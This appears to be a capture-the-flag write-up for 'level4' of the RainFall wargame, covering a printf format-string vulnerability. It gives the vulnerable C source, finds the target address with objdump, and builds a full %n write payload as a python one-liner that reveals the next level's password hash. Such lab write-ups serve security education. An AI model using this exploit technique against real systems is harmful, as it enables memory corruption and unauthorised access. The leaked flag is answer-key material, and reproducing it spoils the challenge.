## level4

This program is similar to the previous one, but the value we must write is much bigger: 16930116

```c
int m;

int p(char* format) { return printf(format); }

void n() {
    char s[520];
    fgets(s, 512, stdin);
    p(s);
    if (m == 16930116) system("/bin/cat /home/user/level5/.pass");
}

int main() { n(); }
```

We find the address with `objdump`:

```console
level4@RainFall:~$ objdump -t level4 | grep m
[...]
08049810 g     O .bss   00000004              m
[...]
```

There are 10 values, then `2578` repeating corresponding to the content of the format string.

```console
level4@RainFall:~$ echo '%x%x%x%x%x%x%x%x%x%x%x%x%x' | ./level4
b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0b7ff37d07825782578257825
```

Using the precision and width modifiers, we can write the exact number of chars that we require. The full payload is:
- address we want to overwrite (in little-endian)
- 10 times `%.0s` to skip the stack until the start of the format string, while writing no character.
- 16930112 (16930116 - the 4 we've written for the address) characters with `%16930112s`
- `%n` to write the result

```console
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%16930112s%n')" | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```